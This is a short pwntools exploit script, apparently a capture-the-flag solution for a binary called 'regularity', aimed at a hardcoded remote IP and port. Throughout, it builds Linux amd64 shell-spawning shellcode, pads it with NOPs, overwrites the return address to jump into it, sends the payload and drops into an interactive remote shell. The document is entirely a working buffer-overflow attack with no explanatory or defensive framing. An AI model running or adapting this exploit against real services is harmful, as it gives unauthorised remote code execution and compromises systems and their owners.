from pwn import *

context.terminal = '/usr/bin/kitty'

if not args.BLIND:
    context.binary = elfexe = ELF('./regularity')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = elfexe.path
    remote_server = '94.237.63.12'
    remote_port = 31193

    return remote(remote_server, remote_port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = asm(shellcraft.amd64.linux.sh())

payload = b''
payload += shellcode
payload += b'\x90'*(0x100-len(shellcode))
payload += p64(0x00401041)

arguments = []
io = start(arguments)

io.sendline(payload)
io.interactive()

io.close()
